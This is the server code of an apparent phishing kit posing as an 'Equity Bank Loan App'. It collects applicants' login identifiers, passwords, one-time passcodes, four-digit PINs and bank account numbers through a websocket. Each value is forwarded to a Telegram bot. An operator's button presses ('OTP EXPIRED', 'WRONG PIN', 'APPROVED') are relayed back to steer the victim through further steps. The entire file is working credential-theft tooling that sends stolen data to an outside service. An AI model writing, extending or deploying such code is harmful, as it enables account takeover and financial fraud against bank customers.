const express = require('express');
const expressWs = require('express-ws');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
expressWs(app);

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN_HERE';

let bot = null;
let adminChatId = null;

if (BOT_TOKEN && BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN_HERE') {
  bot = new TelegramBot(BOT_TOKEN, { polling: true });

  bot.onText(/\/start/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(
      adminChatId,
      '🤖 *Equity Bank Loan Admin Bot Activated*\n\nYou will receive live loan applicant updates and interactive approval buttons here.',
      { parse_mode: 'Markdown' }
    );
  });

  bot.on('callback_query', (query) => {
    const action = query.data;
    const chatId = query.message.chat.id;

    broadcastToClients({ type: 'ADMIN_ACTION', action });

    bot.answerCallbackQuery(query.id, { text: `Action sent: ${action}` });
    bot.sendMessage(chatId, `✅ *Executed Action:* ${action}`, { parse_mode: 'Markdown' });
  });
}

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const clients = new Set();

app.ws('/ws', (ws, req) => {
  clients.add(ws);

  ws.on('message', (msgStr) => {
    try {
      const data = JSON.parse(msgStr);
      handleClientMessage(data);
    } catch (e) {
      console.error('Error parsing client message:', e);
    }
  });

  ws.on('close', () => {
    clients.delete(ws);
  });
});

function broadcastToClients(data) {
  const payload = JSON.stringify(data);
  for (const client of clients) {
    if (client.readyState === 1) {
      client.send(payload);
    }
  }
}

function handleClientMessage(data) {
  if (!bot || !adminChatId) return;

  switch (data.step) {
    case 'LOGIN_SUBMIT': {
      const text = `📥 *NEW APPLICANT LOGIN*\n\n` +
        `• *Country:* ${data.country}\n` +
        `• *Identifier:* ${data.identifier}\n` +
        `• *Password:* ${data.password}\n` +
        `• *Currency:* ${data.currency}`;

      bot.sendMessage(adminChatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'ALLOW', callback_data: 'ALLOW' },
              { text: 'DENY', callback_data: 'DENY' }
            ]
          ]
        }
      });
      break;
    }

    case 'OTP_SUBMIT': {
      const text = `🔑 *OTP SUBMITTED*\n\n` +
        `• *Applicant:* ${data.identifier}\n` +
        `• *OTP Entered:* \`${data.otp}\``;

      bot.sendMessage(adminChatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'OTP EXPIRED', callback_data: 'OTP_EXPIRED' },
              { text: 'OTP CORRECT', callback_data: 'OTP_CORRECT' }
            ]
          ]
        }
      });
      break;
    }

    case 'PIN_SUBMIT': {
      const text = `🔒 *ACCOUNT PIN SUBMITTED*\n\n` +
        `• *Applicant:* ${data.identifier}\n` +
        `• *4-Digit PIN:* \`${data.pin}\``;

      bot.sendMessage(adminChatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'CONTINUE', callback_data: 'CONTINUE' },
              { text: 'BLOCK', callback_data: 'BLOCK' }
            ]
          ]
        }
      });
      break;
    }

    case 'ACCOUNT_SUBMIT': {
      const text = `🏦 *BANK ACCOUNT SUBMITTED*\n\n` +
        `• *Applicant:* ${data.identifier}\n` +
        `• *Account No:* \`${data.accountNo}\``;

      bot.sendMessage(adminChatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'WRONG PIN', callback_data: 'WRONG_PIN' },
              { text: 'WRONG ACC. NUMBER', callback_data: 'WRONG_ACC_NUMBER' },
              { text: 'APPROVED', callback_data: 'APPROVED' }
            ]
          ]
        }
      });
      break;
    }
  }
}

app.listen(PORT, () => {
  console.log(`Equity Bank Loan App running on port ${PORT}`);
});
    
